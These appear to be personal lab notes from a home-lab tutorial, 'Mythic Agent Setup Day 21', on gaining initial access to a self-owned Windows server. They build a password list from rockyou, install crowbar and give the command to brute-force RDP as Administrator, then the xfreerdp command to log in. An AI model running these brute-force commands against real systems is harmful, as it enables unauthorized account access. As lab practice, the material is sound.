MYTHIC AGENT SETUP TUTORIAL DAY 21


Create Passwords.txt in Windows server. Change password of server to whats in the file.

Use Kali linux vm to create a password list (take from rockyou list). Take first 50 and add your windows PW to it - I know,
it's cheating. THIS IS PROOF OF CONCEPT.

Update my kali with sudo apt-get u  pdate && sudo apt-get upgrade -y

For brute force password, we'll use crowbar. Need to install it. 
sudo apt-get install -y crowbar

INITIAL ACCESS PHASE - Use crowbar to bruteforce RDP into windows server

Create a txtfile in kali - windows IP
                           Username

command
crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s [TARGET IP]/IPRange

tool, rdp service, useraccount, wordlist, -s=targetip, cidr range for just this machine. 

next, we'll use xfreerdp to remote in!
/u:Administrator /p:[PASSWORD] /v:[WINDOWSIP]:[PORT]
